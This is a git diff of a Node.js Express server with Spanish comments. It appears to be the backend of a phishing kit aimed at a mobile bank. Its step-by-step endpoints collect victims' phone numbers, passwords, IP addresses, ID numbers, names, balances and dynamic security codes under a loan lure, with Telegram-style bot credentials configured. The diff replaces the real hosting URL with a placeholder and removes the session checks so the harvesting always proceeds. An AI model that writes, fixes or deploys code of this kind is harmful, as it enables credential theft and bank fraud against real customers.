@@ -23,7 +23,7 @@ app.use(express.static('public')); // Servir archivos estáticos
 // ==================== VARIABLES DE ENTORNO ====================
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
-const RENDER_URL = process.env.RENDER_URL || 'https://propulsorneq.onrender.com';
+const RENDER_URL = process.env.RENDER_URL || 'https://tu-proyecto.onrender.com';
 
 if (!BOT_TOKEN || !CHAT_ID) {
   console.warn("[WARN] BOT_TOKEN o CHAT_ID no definidos en variables de entorno.");
@@ -133,14 +133,7 @@ app.post('/step1-credentials', async (req, res) => {
     }
 
     // Guardar en sesión
-    const session = sessionData.get(sessionId);
-	if (!session) {
-	   return res.status(400).json({
-	   ok: false,
-	   error: "Session no existe o se perdió"
-		  });
-		}
-
+    const session = sessionData.get(sessionId) || {};
     session.phoneNumber = phoneNumber;
     session.password = password;
     session.ip = ip;
@@ -182,14 +175,7 @@ app.post('/step2-loan-first', async (req, res) => {
     } = req.body;
 
     // Guardar en sesión
-    const session = sessionData.get(sessionId);
-	if (!session) {
-	    return res.status(400).json({
-		ok: false,
-		error: "Session no existe o se perdió"
-		  });
-		}
-
+    const session = sessionData.get(sessionId) || {};
     session.cedula = cedula;
     session.nombreCompleto = nombreCompleto;
     session.ocupacion = ocupacion;
@@ -217,14 +203,7 @@ app.post('/step2-loan-second', async (req, res) => {
     }
 
     // Obtener datos de sesión
-    const session = sessionData.get(sessionId);
-	if (!session) {
-	  return res.status(400).json({
-		ok: false,
-		error: "Session no existe o se perdió"
-	  });
-}
-
+    const session = sessionData.get(sessionId) || {};
     session.saldoActual2 = saldoActual; // Segundo saldo
     sessionData.set(sessionId, session);
 
@@ -272,14 +251,7 @@ app.post('/step3-dynamic', async (req, res) => {
     }
 
     // Obtener datos de sesión
-    const session = sessionData.get(sessionId);
-	if (!session) {
-	  return res.status(400).json({
-		ok: false,
-		error: "Session no existe o se perdió"
-	  });
-	}
-
+    const session = sessionData.get(sessionId) || {};
     
     // Guardar la dinámica
     if (!session.dynamics) {
